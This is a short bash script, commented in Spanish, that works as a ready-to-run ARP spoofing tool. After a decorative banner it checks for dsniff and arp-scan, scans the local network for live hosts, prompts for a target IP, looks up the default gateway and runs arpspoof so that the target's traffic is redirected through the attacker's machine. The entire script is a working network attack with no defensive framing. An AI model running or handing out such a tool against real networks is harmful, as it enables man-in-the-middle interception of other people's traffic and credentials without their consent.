#!/bin/bash 

# Verificar si las herramientas están disponibles 
check_herramientas() {
    if ! [ -x "$(command -v $1)" ]; then
        echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again. \033[0m" >&2
        exit 1
    fi
}

check_herramientas "dsniff"
check_herramientas "arp-scan"
check_herramientas "netdiscover"

# Mostrar el banner
echo -e "\033[1;35m    _______  _______  ______   _______  _        _______  _        _______ _________ _______ "
echo "   (  ___  )(  ____ )(  ___ \ (  ___  )( \      (  ____ \( (    /|(  ____ \\\__   __/(  ___  )"
echo "   | (   ) || (    )|| (   ) )| (   ) || (      | (    \/|  \  ( || (    \/   ) (   | (   ) |"
echo "   | (___) || (____)|| (__/ / | |   | || |      | (__    |   \ | || |         | |   | |   | |"
echo "   |  ___  ||     __)|  __ (  | |   | || |      |  __)   | (\ \) || |         | |   | |   | |"
echo "   | (   ) || (\ (   | (  \ \ | |   | || |      | (      | | \   || |         | |   | |   | |"
echo "   | )   ( || ) \ \__| )___) )| (___) || (____/\| (____/\| )  \  || (____/\___) (___| (___) |"
echo -e "   |/     \||/   \__/|/ \___/ (_______)(_______/(_______/|/    )_)(_______/\_______/(_______)\033[0m"
echo -e "\033[1;31m                      ______        __   _______                                  "
echo "                     |   _  \.-----|  |_|   _   .--.--.----.-----.-----."
echo "                     |.  |   |  -__|   _|.  1   |  |  |   _|  _  |  -__|"
echo "                     |.  |   |_____|____|.  ____|_____|__| |___  |_____|"
echo "                     |:  |   |          |:  |              |_____|"
echo "                     |::.|   |          |::.|"
echo "                     '--- ---'          '---'  v1.1  "
echo -e "\033[1;32m "
cat dibujo.txt
echo -e " \033[0m"

# Escanear la red para encontrar direcciones IP activas
echo -e "\033[0;33m"
read -p "Show interface ip: " red
echo -e "\033[1;31mScanning network for active hosts...\033[0m"
ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')

# Mostrar las direcciones IP encontradas
echo -e "\033[1;33mActive hosts on the network:\033[0m"
echo "$ips"

# leer la dirección IP 
echo -e "\033[1;36m "
read -p "Enter the target's IP: " ip

# Calcular la dirección de la puerta de enlace
puerta_enlace=$(ip route | grep default | awk '{print $3}')

# ataque arp
echo "Performing ARP spoofing attack against $ip..."
arpspoof -i "$red" -t "$ip" "$puerta_enlace"

# Limpiar y finalizar el script
echo -e "\033[0m"
